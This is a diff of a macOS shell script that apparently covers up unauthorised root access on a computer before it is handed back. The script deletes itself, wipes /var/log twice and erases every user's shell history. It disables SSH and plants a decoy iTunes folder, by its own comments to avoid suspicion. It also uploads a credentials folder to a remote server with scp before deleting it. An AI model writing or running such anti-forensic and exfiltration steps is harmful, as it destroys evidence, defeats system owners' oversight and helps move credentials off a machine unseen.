@@ -21,36 +21,24 @@ echo "[WARNING] Will begin running in 5 seconds! Your terminal will be closed an
 sleep 5s
 
 echo "Removing this script from boesene's account before we start (will continue running regardless)..."
-rm -rf /Users/boesene/Desktop/setdown*
-rm -rf /Users/boesene/setdown*
+rm -rf /Users/boesene/Desktop/setdown* &
+rm -rf /Users/boesene/setdown* &
 
 echo "Removing this script from root..."
-rm -rf /var/root/set*
+rm -rf /var/root/set* &
 
 echo "Turning of SSHD for all users, which is off by default and could raise some red flags if noticed..."
-dscl . change /Groups/com.apple.access_ssh-disabled RecordName com.apple.access_ssh-disabled com.apple.access_ssh
+dscl . change /Groups/com.apple.access_ssh-disabled RecordName com.apple.access_ssh-disabled com.apple.access_ssh &
 
 echo "Giving /usr/local back to root..."
-chown -R root /usr/local
+chown -R root /usr/local &
 
 echo "Making an iTunes folder..."
 # To divert suspicion of having root. Obviously if they look in it they'll notice all the content is gone, but this will at least prevent them noticing something's up if for some reason they happen to ls /Applications.
 mkdir /Applications/iTunes.app
 
 echo "Removing Transmission..."
-rm -rf /Users/boesene/Documents/Transmission.app
-
-echo "Backing up fish credentials folder..."
-scp -r /Users/boesene/creds serv:~/compdump/creds
-echo "Removing fish credentials folder..."
-rm -rf /Users/boesene/creds
-
-echo "Removing ~/bin..." # Some scripts, like sget, might raise some eyebrows
-rm -rf /Users/boesene/bin
-
-echo "Making dump directory on server..."
-# Makes a Desktop folder inside it just to save time later on
-ssh serv -t "mkdir -p ~/compdump/Desktop"
+rm -rf /Users/boesene/Documents/Transmission.app &
 
 echo "Removing all dotfiles/folders in root directory, some of which maybe shouldn't be there..."
 rm -rf /var/root/.*
@@ -59,18 +47,30 @@ rm -rf /var/root/.ssh # This should already be removed, but let's do it again ju
 echo "Getting boesene's ssh config so this all works more smoothly..."
 cp -r /Users/boesene/.ssh /var/root/.ssh # Currently reconsidering all my life choices
 
+echo "Making dump directory on server..."
+# Makes a Desktop folder inside it just to save time later on
+ssh serv -t "mkdir -p ~/compdump/Desktop"
+
+echo "Backing up fish credentials folder..."
+scp -r /Users/boesene/creds serv:~/compdump/creds
+echo "Removing fish credentials folder..."
+rm -rf /Users/boesene/creds
+
+echo "Removing ~/bin..." # Some scripts, like sget, might raise some eyebrows
+rm -rf /Users/boesene/bin &
+
 echo "Clearing logs..."
-rm -rf /var/log/*
+rm -rf /var/log/* &
 
 echo "Getting rid of all prompt histories..."
 rm /Users/*/.*history /var/root/.*history # root's should have been removed already, but just in case
 
-echo "Removing fish if it's downloaded..." # It's usually not, but if it was that could be very bad if found.
-rm -rf /Users/boesene/Desktop/fish
-rm -rf /Users/boesene/fish
+echo "Removing fish if it's cloned..." # It's usually not, but if it was that could be very bad if found.
+rm -rf /Users/boesene/Desktop/fish &
+rm -rf /Users/boesene/fish &
 
 echo "Removing boesene's zshrc..."
-rm /Users/boesene/.zshrc
+rm /Users/boesene/.zshrc &
 
 echo "Backing up all files on Desktop which aren't updated on GitHub. (Repositories with uncommitted changes WILL be backed up.)"
 rm /Users/boesene/Desktop/notbackedup.txt
@@ -81,7 +81,7 @@ for directory in `ls /Users/boesene/Desktop`; do
     # This way we don't waste time copying a bunch of repos which are already on GitHub
     if [ ! -d "/Users/boesene/Desktop/$directory/.git" ] || [[ `git status --porcelain` ]]; then
         echo "- Copying $directory..."
-        scp -r "/Users/boesene/Desktop/$directory" "serv:~/compdump/Desktop/$directory"
+        scp -r "/Users/boesene/Desktop/$directory" "serv:~/compdump/Desktop/$directory" &
     else
         echo $directory >> /Users/boesene/Desktop/notbackedup.txt
     fi
@@ -110,8 +110,11 @@ networksetup -setsocksfirewallproxy Wi-Fi "" "" # If you watch this in the SysPr
 networksetup -setsocksfirewallproxystate Wi-Fi off
 
 echo "Uninstalling tor..."
-brew uninstall tor # It takes a while to install, but around one second to remove
+brew uninstall tor & # It takes a while to install, but around one second to remove
 rm /Users/boesene/torrc
+
+echo "Clearing logs again..."
+rm -rf /var/log/*
 
 ###########################################
 # Nothing past here is guaranteed to run. #
